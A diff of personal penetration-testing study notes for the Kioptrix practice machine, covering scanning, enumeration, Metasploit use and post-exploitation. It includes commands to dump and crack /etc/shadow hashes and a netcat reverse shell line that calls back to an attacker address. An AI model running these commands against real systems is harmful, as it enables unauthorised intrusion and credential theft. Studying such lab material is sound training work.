@@ -129,13 +129,27 @@ kioptrix- level 1 This is a first level machine, login john and pw TwoCows2
 `SYN SYNACK ACK nmap sS` - stelth scanning (used to be undectable, but these days the scanning is detectable) the stealthiness is the trick of faking a connection, but then not establishing one. 
 - Modification: SYN SYNACK RST - this specification is a trick to reveal port, but not establishing a connection. 
 `nmap -T4 -p- -A <ipaddress>` T4 is speed (max 5- might miss some things) -p- means scanning all ports, but if you leave this out then it means that it will scan top 1000 ports I can also specify certain ports if I like for example -p 80,443. -A tell me everything (OS detection, version detection, script scanning and trace route). Not that even if its not typed in the command `-sS`  (stelth scan for TCP) is automatically included
+    Note that -A is the real speed killer here as it is checking for all the versions
 `nmap -sU -T4 -p- -A <ipaddress>`  - sU is for scanning UDP
 nmap can be used for script scaning, OS detection - other options: version detection, script scanning and trace route if I select -A - it will do all these functions, but is slow. We can also specify the ports. 
 - We want to look at what ports are open and whats running on these open ports
 
+**Other methods of scanning**
+- One method is shown above
+- massscan
+- Masscan - scan theentire internet quickly. It is built in. We can also scan specific ports: `massscan -p1-65535 <ip address>`
 
-**Enumerating ports**
-- Can start with investigating on ports 80, 443, 139
+- **Things to look for when you have run the scan**
+- Look for open ports
+- anonymous FTP allowed?
+- versions for exploitation such as SAMBA
+- If SSH is open then if you attack it then the company should be able to detect it, attacking SSH makes you noisy. If the blue team of the company is unable to detect then their defences are likely very weak
+- OS guesses, may not be accurate initially- you can confirm this after you are able to gain access
+
+**After inspecting the scan findings**
+
+- **Enumerating ports**
+- Can start with investigating on ports 80, 443, 139 or the ones that are open
 - A tool nikto - It is a web vulnerability scanner - It can also backfire sometimes because if the company's website uses advance security features, it can autoblock
 - `nikto -h http://192.168.57.134`. When this scan is run, it will list out a bunch of vulnerabilities. Save the scan findings into a text file
 - `dirbuster, gobuster` - this has a list of directories and will scan to detect them. Some of these softwares are built in Kali linux. It can also scan the files. I can use this in conjunction with` burp suite` to intercept traffic. We are looking for what services are being run and what are the versions of the softwares installed. 
@@ -143,21 +157,41 @@ nmap can be used for script scaning, OS detection - other options: version detec
 Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 
 - SMB. SMB is a file share. Manages uploading, DL files or sharing files with co-workers. It is important to know what type of SMB version is being used
-- Metasploit- run `msfconsole` in terminal- exploitation framework. Does exploits, **auxillary stuff(exploitation and enumeration)** - It is built into Kali linux
+- **Metasploit**- run `msfconsole` in terminal- exploitation framework. Does exploits, **auxillary stuff(exploitation and enumeration)** - It is built into Kali linux
     Rhosts - target address, `set RHOSTS 192.168.57.139`and then `run` This refers fo remote hosts, hosts are the individual machines in the network
     Lhosts
-- Smbclient - it attempts to connect with file sharing using anonymous access `smbclient -L \\\\<ip address>\\` Once it shows the folders that can be connected to then you can connect to them, and it will be like connecting using anomalous ip and then using terminal
+- **Smbclient** - it attempts to connect with file sharing using anonymous access `smbclient -L \\\\<ip address>\\` Once it shows the folders that can be connected to then you can connect to them, and it will be like connecting using anomalous ip and then using terminal
 
 - connecting to ssh `ssh <ipaddress>` -oKexAlgorithms. We will attempt to connect- goal is to see if there is a banner that can have some information
 
-- Once you identify the vulnerabilities then you should who it can be exploited by searching in google. Basically what you will find is the code
+- Once you identify the vulnerabilities then these can be exploited by searching in google. Basically what you will find is the code on the web that is written to exploit a particular vulnerability
 
 - Another terminal command `searchsploit` What this does is search for the scripts and then downloads. It should not be very specific. This is an additional tool in addition to google
 
-**Additional scanning tools**
-- Masscan - scan theentire internet quickly. It is built in. We can also scan specific ports: `massscan -p1-65535 <ip address>`
+
+
 
 ## Exploitation
+
+- **Metasploit COmmands**
+- `msfconsole`
+- `getuid` if yout type this after establishing a session then you will be able to se whether what level of access we were able to obtain. if its **NT AUthorization** then its the highest level
+- `sysinfo` This will tell us about the system that we have hacked into
+- `systemctl postgresql enable` This will have postgresql running which metasploit needs to run, Even if I do not do it it is fine, as the program will load it anyway, but will be faster otherwise if I do. 
+
+- Typically after running the `nmap` scan you will have info regarding the version of filesystem such as samba- then you google for that version to find code for exploitation. 
+- Then you paste that code into metasploit command terminal
+- you can then type `options`
+- `set rhosts <ip address of victim>`
+- `show targets`
+- `run`
+
+- Then once you have gained access, you can type `whoami` to see if you got root access, then you can explore further with:
+    `ls`, `pwd`, `updatedb`, ` locate root.txt`, `locate user.txt`, `cat etc/passwd`, `cat etc/shadow`, `gedit passwd`, `gedit shadow` to copy the contents of your file into text files so you can **unshadow** them using `unshadow passwd shadow` these are the names of the files as you saved using gedit
+    What this does is replaces the 'x' in the passwd file with the hash and then you can crack the hashes using **hashcat**
+
+- There are a bunch of commands that we can run with metasploit like after typing gaining access with metasploit I can type 'help" and under the networking section there will be commands that you can run. 
+
 
 - Netcat - This opens a listening port on our attack box machine `nc <ip address> port` this will establishing a listening port to check if the victim connects with the attack machine
 - Reverse shell is when a victim tries to connect with the attack machine - used 95% of the time
@@ -167,6 +201,7 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 **Reverse Shell**
 -`nc -nvlp 444` attack box (lvp means listening verbose port)
 -`nc 192.168.1.1 4444 -e /bin/sh` This is telling the victim machine to connect to the ip address of my attack machine 
+- Whenever a victim connects back to 
 
 **Bin shell**
 - You send an exploit to the victim's machine and then open a port there. Next you connect to it via your attacking VM once the port is established. All of this is done using Netcat
